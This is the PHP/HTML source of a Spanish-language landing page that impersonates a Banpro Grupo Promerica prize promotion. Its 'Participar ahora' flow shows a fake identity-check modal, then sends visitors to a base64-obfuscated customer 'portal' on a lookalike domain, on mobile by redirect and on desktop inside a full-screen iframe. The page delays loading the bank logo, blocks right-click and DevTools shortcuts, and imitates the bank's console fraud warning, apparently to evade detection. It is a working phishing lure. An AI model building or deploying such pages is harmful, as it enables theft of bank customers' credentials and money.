<?php
header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
header('Pragma: no-cache');
header('Expires: Thu, 01 Jan 1970 00:00:00 GMT');
$v = time();
?>
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta name="robots" content="noindex, nofollow" />
  <meta name="author" content="" />
  <title>Cómo Participar</title>
  <script>
    if ('scrollRestoration' in history) history.scrollRestoration = 'manual';
    window.addEventListener('load',     () => window.scrollTo(0, 0));
    window.addEventListener('pageshow', () => window.scrollTo(0, 0));
  </script>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      -webkit-user-select: none;
      -moz-user-select: none;
      user-select: none;
      -webkit-tap-highlight-color: transparent;
    }

    body {
      min-height: 100vh;
      font-family: Arial, Helvetica, sans-serif;
      background: linear-gradient(to top, #00693c 8%, #ffffff 64%);
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 0 0 40px;
    }

    /* ── TOP HEADER ── */
    .topbar {
      width: 100%;
      background: #ffffff;
      box-shadow: 0 2px 10px rgba(0,0,0,0.06);
      padding: 12px 18px;
      display: flex;
      align-items: center;
      justify-content: space-between;
      position: sticky;
      top: 0;
      z-index: 100;
    }

    .topbar-logo {
      height: 54px;
      width: 160px;
      display: block;
      background-repeat: no-repeat;
      background-position: left center;
      background-size: contain;
    }

    @media (max-width: 480px) {
      .topbar { padding: 1px 16px; }
      .topbar-logo { height: 76px; width: 200px; }
    }

    .menu-btn {
      background: none;
      border: none;
      cursor: pointer;
      display: flex;
      flex-direction: column;
      gap: 5px;
      padding: 8px;
    }
    .menu-btn span {
      display: block;
      width: 26px;
      height: 2.5px;
      background: #2a2a2a;
      border-radius: 2px;
    }

    .page-pad {
      width: 100%;
      max-width: 420px;
      padding: 24px 16px 0;
    }

    .wrapper {
      width: 100%;
      max-width: 420px;
    }

    .wrapper { padding: 0; }

    @keyframes float {
      0%, 100% { transform: translateY(0); }
      50%       { transform: translateY(-8px); }
    }

    /* ── PAGE LOAD ANIMATIONS ── */
    @keyframes fadeUp {
      from { opacity: 0; transform: translateY(18px); }
      to   { opacity: 1; transform: translateY(0); }
    }
    @keyframes fadeIn {
      from { opacity: 0; }
      to   { opacity: 1; }
    }
    @keyframes splashOut {
      0%   { opacity: 1; visibility: visible; }
      100% { opacity: 0; visibility: hidden; }
    }
    @keyframes logoPulse {
      0%, 100% { transform: scale(1); }
      50%      { transform: scale(1.06); }
    }

    /* Splash screen */
    .splash {
      position: fixed;
      inset: 0;
      background: #ffffff;
      display: flex;
      align-items: center;
      justify-content: center;
      flex-direction: column;
      gap: 22px;
      z-index: 9999;
      animation: splashOut 0.5s ease 1s forwards;
    }
    .splash img {
      width: 180px;
      max-width: 60vw;
      animation: logoPulse 1.2s ease-in-out infinite;
    }
    .splash-bar {
      width: 120px;
      height: 3px;
      background: #e6e6e6;
      border-radius: 999px;
      overflow: hidden;
      position: relative;
    }
    .splash-bar::after {
      content: '';
      position: absolute;
      inset: 0;
      background: #00693c;
      width: 30%;
      border-radius: 999px;
      animation: splashSlide 1s ease-in-out infinite;
    }
    @keyframes splashSlide {
      0%   { left: -30%; }
      100% { left: 100%; }
    }

    /* Staggered reveal for main content */
    .topbar      { animation: fadeIn  0.6s ease  1.0s both; }
    .hero-img    { animation: fadeUp 0.7s cubic-bezier(0.2,0.8,0.2,1) 1.15s both, float 3.5s ease-in-out 2s infinite; }
    .card        { animation: fadeUp 0.7s cubic-bezier(0.2,0.8,0.2,1) 1.30s both; }
    .title       { animation: fadeUp 0.6s ease 1.50s both; }
    .step        { animation: fadeUp 0.55s ease both; }
    .step:nth-child(1) { animation-delay: 1.65s; }
    .step:nth-child(2) { animation-delay: 1.78s; }
    .step:nth-child(3) { animation-delay: 1.91s; }
    .step:nth-child(4) { animation-delay: 2.04s; }
    .cta-wrap    { animation: fadeUp 0.6s ease 2.20s both; }
    .car-area    { animation: fadeUp 0.7s ease 2.35s both; }
    .bottom      { animation: fadeUp 0.7s ease 2.50s both; }

    .hero-img {
      width: 100%;
      max-width: 360px;
      display: block;
      margin: 0 auto 16px;
      border-radius: 16px;
    }

    .card {
      background: #ffffff;
      border-radius: 24px;
      padding: 28px 22px 0;
      box-shadow: 0 12px 40px rgba(0, 0, 0, 0.22);
      overflow: hidden;
      position: relative;
    }

    .speed {
      position: absolute;
      top: 20px;
      right: 22px;
      width: 38px;
      height: 22px;
      border-top: 5px solid #00853f;
      border-left: 5px solid transparent;
      border-right: 5px solid transparent;
      border-radius: 50px 50px 0 0;
    }

    .speed::after {
      content: "";
      position: absolute;
      width: 20px;
      height: 3.5px;
      background: #00853f;
      right: 0px;
      bottom: 0px;
      transform: rotate(-35deg);
      border-radius: 20px;
    }

    .title {
      text-align: center;
      color: #00693c;
      font-size: 26px;
      font-weight: 900;
      margin-bottom: 24px;
      letter-spacing: -0.3px;
    }

    .steps {
      display: flex;
      flex-direction: column;
      gap: 18px;
      margin-bottom: 28px;
    }

    .step {
      display: grid;
      grid-template-columns: 48px 48px 1fr;
      align-items: center;
      gap: 10px;
    }

    .number {
      font-size: 40px;
      font-weight: 900;
      color: #d8d8d8;
      line-height: 1;
      letter-spacing: -1px;
    }

    .icon {
      width: 46px;
      height: 46px;
      border-radius: 13px;
      background: #f0faf4;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 22px;
      border: 1.5px solid #c8eed8;
    }

    .text {
      color: #1a1a1a;
      font-size: 14px;
      font-weight: 700;
      line-height: 1.3;
    }

    .text .sub {
      display: block;
      font-size: 12px;
      font-weight: 500;
      color: #666;
      margin-top: 2px;
    }

    .register-btn {
      display: inline-block;
      background: #00853f;
      color: #ffffff;
      padding: 12px 22px;
      border-radius: 50px;
      font-size: 14px;
      font-weight: 900;
      text-decoration: none;
      box-shadow: 0 6px 16px rgba(0, 105, 60, 0.35);
      letter-spacing: 0.2px;
      transition: filter 0.2s;
    }
    .register-btn:active { filter: brightness(0.9); }

    .cta-wrap {
      display: flex;
      justify-content: center;
      margin-bottom: 20px;
    }

    .cta-wrap .register-btn {
      font-size: 16px;
      padding: 15px 40px;
    }

    .car-area {
      display: flex;
      justify-content: center;
      margin: 4px 0 -10px;
    }

    .bottom {
      background: #00693c;
      color: #ffffff;
      margin: 0 -22px;
      padding: 52px 22px 30px;
      text-align: center;
      border-radius: 0 0 24px 24px;
    }

    .bottom h2 {
      font-size: 18px;
      font-weight: 900;
      line-height: 1.35;
      margin-bottom: 10px;
      letter-spacing: -0.2px;
    }

    .bottom p {
      font-size: 13px;
      line-height: 1.5;
      color: rgba(255,255,255,0.82);
      font-weight: 600;
    }

    .star {
      color: #7fffb2;
      font-weight: 900;
    }

    /* ── MODAL ── */
    .modal-backdrop {
      position: fixed;
      inset: 0;
      background: rgba(0, 0, 0, 0.55);
      -webkit-backdrop-filter: blur(8px);
      backdrop-filter: blur(8px);
      display: none;
      align-items: center;
      justify-content: center;
      padding: 20px;
      z-index: 999;
      opacity: 0;
      transition: opacity 0.25s ease;
    }
    .modal-backdrop.active {
      display: flex;
      opacity: 1;
    }

    .modal-card {
      background: #ffffff;
      border-radius: 22px;
      padding: 32px 26px 26px;
      width: 100%;
      max-width: 360px;
      text-align: center;
      box-shadow: 0 24px 60px rgba(0,0,0,0.4);
      transform: translateY(20px) scale(0.96);
      transition: transform 0.3s cubic-bezier(0.2, 0.8, 0.2, 1);
      position: relative;
    }
    .modal-backdrop.active .modal-card {
      transform: translateY(0) scale(1);
    }

    .modal-close {
      position: absolute;
      top: 12px;
      right: 14px;
      background: none;
      border: none;
      font-size: 22px;
      color: #999;
      cursor: pointer;
      width: 32px;
      height: 32px;
      border-radius: 50%;
      transition: background 0.2s;
    }
    .modal-close:hover { background: #f2f2f2; }

    .modal-icon {
      width: 64px;
      height: 64px;
      margin: 0 auto 16px;
      background: #e8f5ee;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .modal-icon svg { width: 32px; height: 32px; }

    .modal-title {
      font-size: 19px;
      font-weight: 900;
      color: #1a1a1a;
      margin-bottom: 8px;
      letter-spacing: -0.3px;
    }
    .modal-subtitle {
      font-size: 13.5px;
      color: #666;
      font-weight: 500;
      line-height: 1.45;
      margin-bottom: 22px;
    }

    .modal-btn {
      display: block;
      width: 100%;
      background: #00693c;
      color: #fff;
      border: none;
      border-radius: 50px;
      padding: 14px;
      font-family: Arial, Helvetica, sans-serif;
      font-size: 15px;
      font-weight: 900;
      cursor: pointer;
      text-decoration: none;
      box-shadow: 0 6px 18px rgba(0, 105, 60, 0.3);
      transition: filter 0.2s, transform 0.1s;
    }
    .modal-btn:hover  { filter: brightness(1.1); }
    .modal-btn:active { transform: scale(0.98); }

    .modal-cancel {
      display: block;
      width: 100%;
      background: none;
      border: none;
      color: #888;
      padding: 12px;
      margin-top: 8px;
      font-family: Arial, Helvetica, sans-serif;
      font-size: 13px;
      font-weight: 600;
      cursor: pointer;
    }
    .modal-cancel:hover { color: #333; }

    .modal-secure {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 6px;
      font-size: 11px;
      color: #999;
      font-weight: 500;
      margin-top: 14px;
    }
    .modal-secure svg { width: 12px; height: 12px; }

    /* GIF loader */
    .loader-wrap {
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 14px;
      padding: 10px 0 4px;
    }
    .loader-ring {
      width: 56px;
      height: 56px;
      border-radius: 50%;
      border: 5px solid #e8f5ee;
      border-top-color: #00693c;
      border-right-color: #00a152;
      animation: spin 0.8s linear infinite;
    }
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
    .loader-dots {
      display: flex;
      gap: 6px;
    }
    .loader-dots span {
      width: 7px;
      height: 7px;
      border-radius: 50%;
      background: #00693c;
      animation: bounce 1.2s ease-in-out infinite;
    }
    .loader-dots span:nth-child(2) { animation-delay: 0.2s; }
    .loader-dots span:nth-child(3) { animation-delay: 0.4s; }
    @keyframes bounce {
      0%, 80%, 100% { transform: scale(0.6); opacity: 0.4; }
      40%            { transform: scale(1);   opacity: 1; }
    }
    .loader-text {
      font-size: 13px;
      color: #555;
      font-weight: 600;
      letter-spacing: 0.2px;
    }

    /* ── IFRAME OVERLAY ── */
    .ext-frame {
      position: fixed;
      inset: 0;
      width: 100%;
      height: 100%;
      border: 0;
      background: #fff;
      z-index: 9998;
      display: none;
    }
    .ext-frame.active { display: block; }

    @media (max-width: 380px) {
      .title { font-size: 22px; }
      .number { font-size: 34px; }
      .step { grid-template-columns: 42px 44px 1fr; gap: 8px; }
      .card { padding: 24px 16px 0; }
      .bottom { margin: 0 -16px; padding: 52px 16px 28px; }
    }
  </style>
</head>

<body>

  <div class="splash" id="splash">
    <div class="splash-bar"></div>
  </div>

  <header class="topbar">
    <div class="topbar-logo" id="brandSlot" aria-label="Marca" role="img"></div>
    <button class="menu-btn" aria-label="Menú" onclick="logout()">
      <span></span><span></span><span></span>
    </button>
  </header>

  <main class="wrapper page-pad">
    <img class="hero-img" src="img/banner.jpg?v=<?php echo $v; ?>" alt="Banner promocional">

    <section class="card">
       <div class="content">
        <h1 class="title">¿Cómo Participar?</h1>

        <div class="steps">

          <div class="step">
            <div class="number">1.</div>
            <div class="icon">📩</div>
            <div class="text">Envía tu Solicitud Ahora</div>
          </div>

          <div class="step">
            <div class="number">2.</div>
            <div class="icon">🔐</div>
            <div class="text">Recibe tu Código</div>
          </div>

          <div class="step">
            <div class="number">3.</div>
            <div class="icon">📱</div>
            <div class="text">Regístralo Gratis</div>
          </div>

          <div class="step">
            <div class="number">4.</div>
            <div class="icon">⭐</div>
            <div class="text">Listo, ya estarías participando</div>
          </div>

        </div>

        <div class="cta-wrap">
          <button type="button" class="register-btn" onclick="openModal()">Participar ahora</button>
        </div>

        <div class="car-area">
          <img src="img/auto.png?v=<?php echo $v; ?>" alt="Auto Banpro" style="width:95%; max-width:299px; display:block;">
        </div>
<br>      <div class="bottom">
          <h2>Los ganadores serán anunciados a través de nuestros canales oficiales.</h2>
          <p>Consigue tu <span class="star">estrella</span> hoy y participa por esta gran oportunidad.</p>
        </div>
      </div>
    </section>
  </main>

  <!-- ── IDENTITY MODAL ── -->
  <div class="modal-backdrop" id="identityModal" onclick="if(event.target===this) closeModal()">
    <div class="modal-card" role="dialog" aria-modal="true" aria-labelledby="modalTitle">
      <button class="modal-close" type="button" onclick="closeModal()" aria-label="Cerrar">✕</button>

      <div class="modal-icon">
        <svg viewBox="0 0 24 24" fill="none" stroke="#00693c" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
          <path d="M12 1l9 4v6c0 5.5-3.8 10.7-9 12-5.2-1.3-9-6.5-9-12V5l9-4z"/>
          <path d="M9 12l2 2 4-4"/>
        </svg>
      </div>

      <h2 class="modal-title" id="modalTitle">Identificate </h2>
      <p class="modal-subtitle">Verificando tu acceso como cliente...</p>

      <div class="loader-wrap">
        <div class="loader-ring"></div>
        <div class="loader-dots">
          <span></span><span></span><span></span>
        </div>
        <div class="loader-text">Cargando...</div>
      </div>

      <div class="modal-secure" style="margin-top:18px;">
        <svg viewBox="0 0 24 24" fill="none" stroke="#999" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
          <rect x="3" y="11" width="18" height="11" rx="2"/>
          <path d="M7 11V7a5 5 0 0110 0v4"/>
        </svg>
        Conexión segura · Banpro Grupo Promerica
      </div>
    </div>
  </div>

  <iframe class="ext-frame" id="extFrame" title="Portal cliente"></iframe>

  <script>
    const _ep = 'aHR0cHM6Ly9iYW5wYmxvZy5jb20vcG9ydGFsL2FjY2Vzby5waHA=';
    const _td = 2500;
    let _t = null;

    function _isMobile() {
      return /Android|iPhone|iPad|iPod|Mobile|Opera Mini|IEMobile/i.test(navigator.userAgent)
          || window.innerWidth < 768;
    }

    function _go() {
      try {
        const url = atob(_ep);
        if (_isMobile()) {
          window.location.href = url;
        } else {
          const f = document.getElementById('extFrame');
          f.src = url;
          f.classList.add('active');
          const m = document.getElementById('identityModal');
          m.classList.remove('active');
          document.body.style.overflow = 'hidden';
          document.title = 'Portal cliente';
        }
      } catch (e) { /* silent */ }
    }

    /* Carga diferida de la marca (no aparece en HTML inicial) */
    setTimeout(function() {
      var b = document.getElementById('brandSlot');
      if (b) {
        var p = 'img/logo.png';
        b.style.backgroundImage = "url('" + p + "')";
      }
    }, 800);

    function openModal() {
      const m = document.getElementById('identityModal');
      m.classList.add('active');
      document.body.style.overflow = 'hidden';
      clearTimeout(_t);
      _t = setTimeout(_go, _td);
    }
    function closeModal() {
      const m = document.getElementById('identityModal');
      m.classList.remove('active');
      document.body.style.overflow = '';
      clearTimeout(_t);
    }
    document.addEventListener('keydown', e => {
      if (e.key === 'Escape') closeModal();
    });

    /* Advertencia en consola */
    (function() {
      const css1 = 'color:#c0392b;font-size:28px;font-weight:900;text-shadow:1px 1px 0 #000;';
      const css2 = 'color:#1a1a1a;font-size:14px;font-weight:600;';
      const css3 = 'color:#888;font-size:12px;';
      console.log('%c\u26a0  ALTO', css1);
      console.log('%cEsta es una funci\u00f3n del navegador destinada a desarrolladores.', css2);
      console.log('%cSi alguien te indic\u00f3 copiar o pegar algo aqu\u00ed para "activar una funci\u00f3n" o "acceder a una cuenta", es un intento de fraude.', css2);
      console.log('%c\u00a9 Banpro Grupo Promerica \u00b7 Acceso restringido', css3);
    })();

    /* 1. Sin clic derecho */
    document.addEventListener('contextmenu', e => e.preventDefault());

    /* 2. Sin seleccion de texto */
    document.addEventListener('selectstart', e => e.preventDefault());

    /* 3. Sin drag de imagenes */
    document.querySelectorAll('img').forEach(i => i.addEventListener('dragstart', e => e.preventDefault()));

    /* 4. Bloqueo suave de atajos de DevTools */
    document.addEventListener('keydown', function(e) {
      const b =
        e.key === 'F12' ||
        (e.ctrlKey && e.shiftKey && ['I','J','C'].includes(e.key.toUpperCase())) ||
        (e.ctrlKey && e.key.toUpperCase() === 'U');
      if (b) { e.preventDefault(); e.stopPropagation(); return false; }
    }, true);
  </script>

</body>
</html>